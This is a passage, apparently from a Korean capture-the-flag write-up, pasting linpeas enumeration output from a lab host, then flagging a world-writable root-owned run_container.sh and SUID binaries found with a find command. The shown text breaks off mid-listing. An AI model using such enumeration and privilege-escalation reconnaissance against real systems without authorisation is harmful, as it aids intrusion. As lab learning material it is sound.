2023-11-11+20:57:40.0558557430 /usr/local/bin/pyrsa-verify
2023-11-11+20:57:40.0558557430 /usr/local/bin/pyrsa-sign
2023-11-11+20:57:40.0558557430 /usr/local/bin/pyrsa-priv2pub
2023-11-11+20:57:40.0558557430 /usr/local/bin/pyrsa-keygen
2023-11-11+20:57:40.0558557430 /usr/local/bin/pyrsa-encrypt
2023-11-11+20:57:40.0558557430 /usr/local/bin/pyrsa-decrypt
2023-11-11+20:57:38.1318439210 /usr/local/bin/undill
2023-11-11+20:57:38.1318439210 /usr/local/bin/get_objgraph
2023-11-11+20:57:38.0678435260 /usr/local/bin/nvd3
2023-11-11+20:57:37.8478421650 /usr/local/bin/gunicorn
2023-11-11+20:57:37.2238382970 /usr/local/bin/register-python-argcomplete
2023-11-11+20:57:37.2238382970 /usr/local/bin/activate-global-python-argcomplete
2023-11-11+20:57:37.1878380740 /usr/local/bin/connexion
2023-11-11+20:57:36.2958325190 /usr/local/bin/slugify
2023-11-11+20:57:36.2598322940 /usr/local/bin/tabulate
2023-11-11+20:57:36.2398321700 /usr/local/bin/httpx
2023-11-11+20:57:36.0038306980 /usr/local/bin/rst2xml.py
2023-11-11+20:57:36.0038306980 /usr/local/bin/rst2html5.py
2023-11-11+20:57:36.0038306980 /usr/local/bin/docutils
2023-11-11+20:57:35.9998306730 /usr/local/bin/rstpep2html.py
2023-11-11+20:57:35.9998306730 /usr/local/bin/rst2xetex.py
2023-11-11+20:57:35.9998306730 /usr/local/bin/rst2s5.py
2023-11-11+20:57:35.9998306730 /usr/local/bin/rst2pseudoxml.py
2023-11-11+20:57:35.9998306730 /usr/local/bin/rst2odt.py
2023-11-11+20:57:35.9998306730 /usr/local/bin/rst2odt_prepstyles.py
2023-11-11+20:57:35.9998306730 /usr/local/bin/rst2man.py
2023-11-11+20:57:35.9998306730 /usr/local/bin/rst2latex.py
2023-11-11+20:57:35.9998306730 /usr/local/bin/rst2html.py
2023-11-11+20:57:35.9998306730 /usr/local/bin/rst2html4.py
2023-11-11+20:57:35.6198282900 /usr/local/bin/sqlformat
2023-11-11+20:57:35.4838274370 /usr/local/bin/alembic
2023-11-11+20:57:35.1278252040 /usr/local/bin/normalizer
2023-11-11+20:57:34.9158238710 /usr/local/bin/markdown_py
2023-11-11+20:57:34.8598235190 /usr/local/bin/mako-render
2023-11-11+20:57:34.7318227100 /usr/local/bin/fabmanager
2023-11-11+20:57:34.3198201110 /usr/local/bin/jsonschema
2023-11-11+20:57:34.0718185450 /usr/local/bin/email_validator
2023-11-11+20:57:32.2958072390 /usr/local/bin/pygmentize
2023-11-11+20:57:31.6038027990 /usr/local/bin/markdown-it
2023-11-11+20:57:30.8277977990 /usr/local/bin/flask
2023-11-11+20:57:30.3317945860 /usr/local/bin/pybabel
2023-08-15+14:59:41.7629687270 /usr/sbin/ips
2023-06-21+08:38:54.9583974720 /etc/console-setup/cached_setup_terminal.sh
2023-06-21+08:38:54.9543974900 /etc/console-setup/cached_setup_font.sh
2023-06-21+08:38:54.9503975080 /etc/console-setup/cached_setup_keyboard.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 20
drwxr-xr-x  3 root root 4096 Jan 10  2024 .
drwxr-xr-x 18 root root 4096 Nov  9 10:57 ..
drwx--x--x  4 root root 4096 Nov 14  2023 containerd
-rw-r--r--  1 root root  861 Dec  7  2023 dockerfile
-rwxrwxrwx  1 root root 1715 Jan 10  2024 run_container.sh

╔══════════╣ Unexpected in root
/.badr-info
/swap.img

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/syslog
/var/log/auth.log
/var/log/kern.log

╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#logrotate-exploitation
logrotate 3.14.0

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes
╔══════════╣ Syslog configuration (limit 50)



module(load="imuxsock") # provides support for local system logging



module(load="imklog" permitnonkernelfacility="on")


$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat

$RepeatedMsgReduction on

$FileOwner syslog
$FileGroup adm
$FileCreateMode 0640
$DirCreateMode 0755
$Umask 0022
$PrivDropToUser syslog
$PrivDropToGroup syslog

$WorkDirectory /var/spool/rsyslog

$IncludeConfig /etc/rsyslog.d/*.conf
╔══════════╣ Auditd configuration (limit 50)
auditd configuration Not Found
╔══════════╣ Log files with potentially weak perms (limit 50)
      748    240 -rw-r-----   1 syslog   adm        242223 Nov  9 11:08 /var/log/syslog
     1422      4 -rw-r-----   1 syslog   adm          1774 Apr 27  2025 /var/log/auth.log.3.gz
      321     48 -rw-r--r--   1 root     adm         45165 May 11  2025 /var/log/dmesg.0
     1706      4 -rw-r-----   1 syslog   adm          2414 Nov  9 11:08 /var/log/auth.log
     1945    136 -rw-r-----   1 syslog   adm        138341 Apr 27  2025 /var/log/syslog.3.gz
     1117    140 -rw-r-----   1 syslog   adm        135788 Nov  9 11:08 /var/log/kern.log
      670    280 -rw-r-----   1 syslog   adm        278905 Nov  9 10:57 /var/log/syslog.1
     1569     40 -rw-r-----   1 syslog   adm         40736 Feb 12  2024 /var/log/syslog.4.gz
      722    136 -rw-r-----   1 syslog   adm        136117 Feb 11  2024 /var/log/syslog.5.gz
      116    140 -rw-r-----   1 syslog   adm        139769 Nov  9 10:57 /var/log/cloud-init.log
      667     16 -rw-r--r--   1 root     adm         14295 Feb 12  2024 /var/log/dmesg.4.gz
     1709      8 -rw-r-----   1 syslog   adm          4694 Nov  9 10:57 /var/log/auth.log.1
       84     48 -rw-r--r--   1 root     adm         47057 Nov  9 10:57 /var/log/dmesg
      862     32 -rw-r-----   1 root     adm         30264 Nov  9 10:57 /var/log/cloud-init-output.log
   406988      0 -rw-r--r--   1 landscape landscape        0 Jun  2  2023 /var/log/landscape/sysinfo.log
      341     88 -rw-r-----   1 syslog    adm          86376 Feb 11  2024 /var/log/kern.log.4.gz
      666     68 -rw-r-----   1 syslog    adm          66781 May 11  2025 /var/log/syslog.2.gz
      349     16 -rw-r--r--   1 root      adm          13560 May 11  2025 /var/log/dmesg.1.gz
     1123     84 -rw-r-----   1 syslog    adm          84395 Jan 10  2024 /var/log/syslog.7.gz
       80     16 -rw-r--r--   1 root      adm          13437 Apr 27  2025 /var/log/dmesg.3.gz
     1587    116 -rw-r-----   1 syslog    adm         116048 Nov  9 10:57 /var/log/kern.log.1
     1620    128 -rw-r-----   1 syslog    adm         127933 Feb 10  2024 /var/log/syslog.6.gz
     1702      4 -rw-r-----   1 syslog    adm           1626 Feb 11  2024 /var/log/auth.log.4.gz
      739    104 -rw-r-----   1 syslog    adm         104077 Apr 27  2025 /var/log/kern.log.3.gz
      141     16 -rw-r--r--   1 root      adm          13553 Apr 27  2025 /var/log/dmesg.2.gz
      742     28 -rw-r-----   1 syslog    adm          26721 May 11  2025 /var/log/kern.log.2.gz
      344      4 -rw-r-----   1 syslog    adm            398 May 11  2025 /var/log/auth.log.2.gz
   524385      4 -rw-r-----   1 root      adm            790 May 11  2025 /var/log/apt/term.log.1.gz
   524369      0 -rw-r-----   1 root      adm              0 Nov  9 10:57 /var/log/apt/term.log
   524348     12 -rw-r-----   1 root      adm          11769 Apr 27  2025 /var/log/apt/term.log.2.gz
   524539      8 -rw-r-----   1 root      adm           7649 Nov 14  2023 /var/log/apt/term.log.4.gz
   524342      8 -rw-r-----   1 root      adm           4775 Jul 30  2023 /var/log/apt/term.log.6.gz
   524500      4 -rw-r-----   1 root      adm           3420 Aug 15  2023 /var/log/apt/term.log.5.gz
   524345     24 -rw-r-----   1 root      adm          21953 Dec 22  2023 /var/log/apt/term.log.3.gz
   524337     12 -rw-r-----   1 root      adm          10448 Jun 21  2023 /var/log/apt/term.log.7.gz

╔══════════╣ Files inside /home/think (limit 20)
total 48
drwxr-xr-x 8 think    think    4096 Feb 10  2024 .
drwxr-xr-x 4 root     root     4096 Nov  9 10:57 ..
lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout
-rw-r--r-- 1 think    think    3771 Nov 14  2023 .bashrc
drwx------ 2 think    think    4096 Nov 14  2023 .cache
drwx------ 3 think    think    4096 Dec  8  2023 .config
drwx------ 3 think    think    4096 Nov  9 11:08 .gnupg
drwxrwxr-x 3 think    think    4096 Jan 10  2024 .local
-rw-r--r-- 1 think    think     807 Nov 14  2023 .profile
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .python_history -> /dev/null
drwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip
drwxr-xr-x 2 think    think    4096 Jan 10  2024 .ssh
-rw-r--r-- 1 root     root       35 Feb 10  2024 user.txt
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .viminfo -> /dev/null

╔══════════╣ Files inside others home (limit 20)
/home/ubuntu/.profile
/home/ubuntu/.bashrc
/home/ubuntu/.bash_logout

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup folders
drwxr-xr-x 2 root root 4096 May 11 19:20 /var/backups
total 40
-rw-r--r-- 1 root root    0 May 11 19:19 apt.extended_states.0
-rw-r--r-- 1 root root    0 Dec 22  2023 apt.extended_states.1.gz
-rw-r--r-- 1 root root 7560 Dec  8  2023 apt.extended_states.2.gz
-rw-r--r-- 1 root root 4522 Dec  8  2023 apt.extended_states.3.gz
-rw-r--r-- 1 root root 4520 Nov 13  2023 apt.extended_states.4.gz
-rw-r--r-- 1 root root 4495 Nov 11  2023 apt.extended_states.5.gz
-rw-r--r-- 1 root root 4501 Nov 11  2023 apt.extended_states.6.gz


╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 191 Dec  8  2023 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 673 Dec  8  2023 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 1219 Dec  8  2023 /etc/xml/sgml-data.xml.old
-rw-r--r-- 1 root root 10151 Dec  8  2023 /etc/xml/docbook-xml.xml.old
-rw-r--r-- 1 root root 3210 Dec  8  2023 /etc/xml/catalog.old
-rw-r--r-- 1 root root 2743 Feb 23  2022 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 4096 Nov  9 11:08 /sys/devices/virtual/net/veth4bca92c/brport/backup_port
-rw-r--r-- 1 root root 39448 Jan 23  2025 /usr/lib/mysql/plugin/component_mysqlbackup.so
-rw-r--r-- 1 root root 1398 Apr 27  2025 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-38.pyc
-rw-r--r-- 1 root root 1759 Dec 16  2024 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 44048 Oct 27  2023 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 11185 Mar 28  2025 /usr/lib/modules/5.15.0-138-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 63321 Mar 28  2025 /usr/lib/modules/5.15.0-138-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 11070 Apr 27  2025 /usr/share/info/dir.old
-rw-r--r-- 1 root root 2756 Feb 13  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 1320 Jul  4  2020 /usr/share/help/C/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 2268 Jul  4  2020 /usr/share/help/C/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2505 Jul  4  2020 /usr/share/help/C/gnome-help/backup-what.page
-rw-r--r-- 1 root root 1262 Jul  4  2020 /usr/share/help/C/gnome-help/backup-why.page
-rw-r--r-- 1 root root 1815 Jul  4  2020 /usr/share/help/C/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2356 Jul  4  2020 /usr/share/help/C/gnome-help/backup-how.page
-rw-r--r-- 1 root root 3396 Jul  4  2020 /usr/share/help/C/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 1999 Jul  4  2020 /usr/share/help/C/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 392817 Feb  9  2020 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root staff 171960 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/googleapiclient/discovery_cache/documents/gkebackup.v1.json
-rw-r--r-- 1 root staff 36492 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/google/cloud/spanner_admin_database_v1/types/backup.py
-rw-r--r-- 1 root staff 35989 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/google/cloud/spanner_admin_database_v1/types/__pycache__/backup.cpython-38.pyc
-rw-r--r-- 1 root staff 17578 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/google/cloud/bigtable/backup.py
-rw-r--r-- 1 root staff 15702 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/google/cloud/bigtable/__pycache__/backup.cpython-38.pyc
-rw-r--r-- 1 root staff 13765 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/google/cloud/spanner_v1/backup.py
-rw-r--r-- 1 root staff 11669 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/google/cloud/spanner_v1/__pycache__/backup.cpython-38.pyc
-rwxr-xr-x 1 root root 1086 Oct 31  2021 /usr/src/linux-hwe-5.15-headers-5.15.0-138/tools/testing/selftests/net/tcp_fastopen_backup_key.sh

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /etc/apparmor/severity.db: ASCII text
Found /var/lib/colord/mapping.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/colord/storage.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3031001

 -> Extracting tables from /var/lib/colord/mapping.db (limit 20)
 -> Extracting tables from /var/lib/colord/storage.db (limit 20)
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)

╔══════════╣ Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root     root     4.0K Jul 30  2023 .
drwxr-xr-x 13 root     root     4.0K Nov 11  2023 ..
drwxrwx---  2 www-data www-data 4.0K Nov 13  2023 html

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 191 Nov  9 10:57 /.badr-info
-rw-r--r-- 1 landscape landscape 0 Feb 23  2022 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
-rw------- 1 root root 0 Feb 23  2022 /etc/.pwd.lock
-rw-r--r-- 1 ubuntu ubuntu 220 Feb 25  2020 /home/ubuntu/.bash_logout
-rw-r--r-- 1 think think 220 Nov 14  2023 /home/think/.bash_logout
-rw-r--r-- 1 root root 0 Nov  9 10:57 /run/ubuntu-fan/.lock
-rw-r--r-- 1 root root 20 Nov  9 10:57 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Nov  9 10:56 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 root root 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
-rw-r--r-- 1 root staff 58 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/numpy/core/include/numpy/.doxyfile
-rw-r--r-- 1 root staff 29 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/numpy/f2py/tests/src/assumed_shape/.f2py_f2cmap
-rw-r--r-- 1 root staff 82 Nov 11  2023 /usr/local/lib/python3.8/dist-packages/numpy/f2py/tests/src/f2cmap/.f2py_f2cmap

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)

╔══════════╣ Searching passwords in history files

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/grub.d/01_password
/etc/pam.d/common-password
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/component_validate_password.so
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/pppd/2.4.7/passwordfd.so
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-38.pyc
/usr/lib/python3/dist-packages/docker/credentials
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-38.pyc
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.1.0.0
/usr/local/lib/python3.8/dist-packages/flask_appbuilder/templates/appbuilder/general/security/resetpassword.html
/usr/local/lib/python3.8/dist-packages/flask_appbuilder/tests/security/__pycache__/test_password_complexity.cpython-38.pyc
/usr/local/lib/python3.8/dist-packages/flask_appbuilder/tests/security/test_password_complexity.py
/usr/local/lib/python3.8/dist-packages/gevent/tests/server.key
/usr/local/lib/python3.8/dist-packages/gevent/tests/test_server.key
/usr/local/lib/python3.8/dist-packages/googleapiclient/discovery_cache/documents/iamcredentials.v1.json
/usr/local/lib/python3.8/dist-packages/google/auth/compute_engine/credentials.py
/usr/local/lib/python3.8/dist-packages/google/auth/compute_engine/__pycache__/credentials.cpython-38.pyc
/usr/local/lib/python3.8/dist-packages/google/auth/_credentials_async.py
/usr/local/lib/python3.8/dist-packages/google/auth/credentials.py
/usr/local/lib/python3.8/dist-packages/google/auth/impersonated_credentials.py
/usr/local/lib/python3.8/dist-packages/google/auth/__pycache__/_credentials_async.cpython-38.pyc
/usr/local/lib/python3.8/dist-packages/google/auth/__pycache__/credentials.cpython-38.pyc
/usr/local/lib/python3.8/dist-packages/google/auth/__pycache__/impersonated_credentials.cpython-38.pyc
/usr/local/lib/python3.8/dist-packages/google/oauth2/_credentials_async.py
/usr/local/lib/python3.8/dist-packages/google/oauth2/credentials.py
/usr/local/lib/python3.8/dist-packages/google/oauth2/gdch_credentials.py
/usr/local/lib/python3.8/dist-packages/google/oauth2/__pycache__/_credentials_async.cpython-38.pyc
/usr/local/lib/python3.8/dist-packages/google/oauth2/__pycache__/credentials.cpython-38.pyc
/usr/local/lib/python3.8/dist-packages/google/oauth2/__pycache__/gdch_credentials.cpython-38.pyc
/usr/local/lib/python3.8/dist-packages/grpc/_cython/_credentials
/usr/local/lib/python3.8/dist-packages/grpc/_cython/_credentials/roots.pem
/usr/local/lib/python3.8/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/local/lib/python3.8/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-38.pyc
/usr/local/lib/python3.8/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-38.pyc
/usr/local/lib/python3.8/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/local/lib/python3.8/dist-packages/sqlalchemy_utils/types/password.py
/usr/local/lib/python3.8/dist-packages/sqlalchemy_utils/types/__pycache__/password.cpython-38.pyc
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
/var/log/dmesg.0:[    5.623854] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/dmesg:[   15.936649] systemd[1]: Started Forward Password Requests to Wall Directory Watch.

╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
_=/dev/shm/linpeas.sh.1
HOME=/home/think
LANG=en_US.UTF-8
LESSCLOSE=/usr/bin/lesspipe %s %s
LESSOPEN=| /usr/bin/lesspipe %s
_=./linpeas.sh.1
LISTEN_FDNAMES=dbus.socket
LISTEN_FDNAMES=pulseaudio.socket
LISTEN_FDS=1
LOGNAME=think
MANAGERPID=1112
MOTD_SHOWN=pam
NOTIFY_SOCKET=/run/systemd/notify
NOTIFY_SOCKET=/run/user/1000/systemd/notify
OLDPWD=/home/think
PWD=/dev/shm
QT_ACCESSIBILITY=1
SHELL=/usr/sbin/ash
SHLVL=1
SSH_CLIENT=10.8.136.212 60936 22
SSH_CONNECTION=10.8.136.212 60936 10.201.11.134 22
SSH_TTY=/dev/pts/0
TERM=xterm
USER=think
_=/usr/bin/dd
_=/usr/bin/grep
_=/usr/bin/xxd
XDG_RUNTIME_DIR=/run/user/1000


                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r'


```

# root 소유인데? 모두가 읽고 쓸 수 있다?

![](https://velog.velcdn.com/images/agnusdei1207/post/15482774-d4b2-46ee-b624-1cfdd952a0f6/image.png)
-rwxrwxrwx 1 root root 1715 Jan 10 2024 run_container.sh

think@ip-10-201-11-134:/dev/shm$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount

think@ip-10-201-11-134:/usr/sbin$ ls -al
total 127048
drwxr-xr-x 2 root root 20480 Apr 27 2025 .
drwxr-xr-x 14 root root 4096 Feb 23 2022 ..
lrwxrwxrwx 1 root root 7 Apr 2 2025 a2disconf -> a2enmod
lrwxrwxrwx 1 root root 7 Apr 2 2025 a2dismod -> a2enmod
lrwxrwxrwx 1 root root 7 Apr 2 2025 a2dissite -> a2enmod
lrwxrwxrwx 1 root root 7 Apr 2 2025 a2enconf -> a2enmod
-rwxr-xr-x 1 root root 16276 Mar 18 2024 a2enmod
lrwxrwxrwx 1 root root 7 Apr 2 2025 a2ensite -> a2enmod
-rwxr-xr-x 1 root root 9870 Apr 2 2025 a2query
-rwxr-xr-x 1 root root 1507 Mar 6 2024 aa-audit
-rwxr-xr-x 1 root root 1546 Mar 6 2024 aa-autodep
-rwxr-xr-x 1 root root 1542 Mar 6 2024 aa-cleanprof
-rwxr-xr-x 1 root root 1438 Mar 6 2024 aa-complain
-rwxr-xr-x 1 root root 2764 Mar 6 2024 aa-decode
-rwxr-xr-x 1 root root 1426 Mar 6 2024 aa-disable
-rwxr-xr-x 1 root root 1423 Mar 6 2024 aa-enforce
-rwxr-xr-x 1 root root 6870 Mar 6 2024 aa-genprof
-rwxr-xr-x 1 root root 2032 Mar 6 2024 aa-logprof
-rwxr-xr-x 1 root root 7287 Mar 6 2024 aa-mergeprof
-rwxr-xr-x 1 root root 3068 Mar 6 2024 aa-remove-unknown
-rwxr-xr-x 1 root root 8839 Mar 6 2024 aa-status
-rwxr-xr-x 1 root root 139 Jun 17 2019 aa-teardown
-rwxr-xr-x 1 root root 6149 Mar 6 2024 aa-unconfined
-rwxr-xr-x 1 root root 3528 Oct 10 2023 aa-update-browser
-rwxr-xr-x 1 root root 14728 Feb 25 2020 accessdb
-rwxr-xr-x 1 root root 3075 Mar 29 2025 addgnupghome
lrwxrwxrwx 1 root root 7 Apr 16 2020 addgroup -> adduser
-rwxr-xr-x 1 root root 860 Dec 7 2019 add-shell
-rwxr-xr-x 1 root root 37785 Apr 16 2020 adduser
-rwxr-xr-x 1 root root 69000 Apr 9 2024 agetty
-rwxr-xr-x 1 root root 708680 Apr 2 2025 apache2
-rwxr-xr-x 1 root root 7229 Mar 18 2024 apache2ctl
lrwxrwxrwx 1 root root 10 Apr 2 2025 apachectl -> apache2ctl
-rwxr-xr-x 1 root root 1526368 Mar 6 2024 apparmor_parser
lrwxrwxrwx 1 root root 9 Mar 6 2024 apparmor_status -> aa-status
-rwxr-xr-x 1 root root 2217 Mar 29 2025 applygnupgdefaults
-rwxr-xr-x 1 root root 1394 Dec 2 2020 aptd
-rwxr-xr-x 1 root root 70960 Feb 1 2019 arp
-rwxr-xr-x 1 root root 80144 Feb 13 2020 arpd
lrwxrwxrwx 1 root root 27 Feb 23 2022 arptables -> /etc/alternatives/arptables
lrwxrwxrwx 1 root root 17 May 9 2023 arptables-nft -> xtables-nft-multi
lrwxrwxrwx 1 root root 17 May 9 2023 arptables-nft-restore -> xtables-nft-multi
lrwxrwxrwx 1 root root 17 May 9 2023 arptables-nft-save -> xtables-nft-multi
lrwxrwxrwx 1 root root 35 Feb 23 2022 arptables-restore -> /etc/alternatives/arptables-restore
lrwxrwxrwx 1 root root 32 Feb 23 2022 arptables-save -> /etc/alternatives/arptables-save
-rwxr-xr-x 1 root root 1183448 Dec 7 2023 ash
-rwxr-xr-x 1 root root 13542 Nov 15 2018 aspell-autobuildhash
-rwxr-xr-x 1 root root 30728 Nov 12 2018 atd
-rwxr-xr-x 1 root root 141832 Nov 16 2023 avahi-daemon
-rwxr-xr-x 1 root root 35144 Oct 9 2023 badblocks
-rwxr-xr-x 1 root root 14488 Jul 23 2020 bcache-super-show
-rwxr-xr-x 1 root root 27856 Dec 23 2019 biosdecode
-rwxr-xr-x 1 root root 14837 Feb 13 2020 blkdeactivate
-rwxr-xr-x 1 root root 35048 Apr 9 2024 blkdiscard
-rwxr-xr-x 1 root root 121096 Apr 9 2024 blkid
-rwxr-xr-x 1 root root 71912 Apr 9 2024 blkzone
-rwxr-xr-x 1 root root 67816 Apr 9 2024 blockdev
lrwxrwxrwx 1 root root 27 Jan 21 2025 bluetoothd -> ../lib/bluetooth/bluetoothd
-rwxr-xr-x 1 root root 38992 Feb 1 2019 brctl
-rwxr-xr-x 1 root root 104760 Feb 13 2020 bridge
lrwxrwxrwx 1 root root 11 Feb 8 2020 cache_check -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 cache_dump -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 cache_metadata_size -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 cache_repair -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 cache_restore -> pdata_tools
lrwxrwxrwx 1 root root 11 Feb 8 2020 cache_writeback -> pdata_tools
-rwxr-xr-x 1 root root 31032 Feb 20 2025 capsh
-rwxr-xr-x 1 root root 105048 Apr 9 2024 cfdisk
-rwxr-xr-x 1 root root 211432 Feb 20 2020 cgdisk
-rwxr-xr-x 1 root root 34984 Jul 23 2020 chat
-rwxr-xr-x 1 root root 47336 Apr 9 2024 chcpu
-rwxr-xr-x 1 root root 952 Apr 26 2011 check_forensic
-rwxr-xr-x 1 root root 67792 Feb 6 2024 chgpasswd
-rwxr-xr-x 1 root root 63720 Apr 9 2024 chmem
-rwxr-xr-x 1 root root 59600 Feb 6 2024 chpasswd
-rwxr-xr-x 1 root root 43352 Sep 5 2019 chroot
lrwxrwxrwx 1 root root 14 Jun 21 2023 cls -> /usr/bin/clear
lrwxrwxrwx 1 root root 4 Feb 6 2024 cpgr -> cppw
-rwxr-xr-x 1 root root 61784 Feb 6 2024 cppw
-rwxr-xr-x 1 root root 14488 Mar 31 2020 cracklib-check
-rwxr-xr-x 1 root root 231 Mar 31 2020 cracklib-format
-rwxr-xr-x 1 root root 14488 Mar 31 2020 cracklib-packer
-rwxr-xr-x 1 root root 14488 Mar 31 2020 cracklib-unpacker
-rwxr-xr-x 1 root root 10232 Feb 5 2018 crda
